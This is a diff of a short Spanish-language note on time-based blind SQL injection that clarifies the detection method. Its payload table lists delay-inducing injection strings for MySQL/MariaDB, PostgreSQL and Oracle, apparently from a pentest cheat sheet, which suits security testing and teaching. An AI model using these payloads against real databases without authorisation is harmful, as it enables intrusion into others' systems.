@@ -1,6 +1,6 @@
 ### Info
 
-Aplicamos lógica de tiempo en SQL para ver si se inyecta y es validada.
+Aplicamos lógica de tiempo en SQL para ver si se inyecta y es validada analizando el tiempo que tardó la response.
 
 ### PAYLOADS
 
@@ -10,3 +10,5 @@ Aplicamos lógica de tiempo en SQL para ver si se inyecta y es validada.
 | MySQL/MariaDB    | AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')  |
 | PostgreSQL    | \|\| (SELECT 1 FROM PG_SLEEP(10))   |
 | Oracle    | AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)  |
+
+
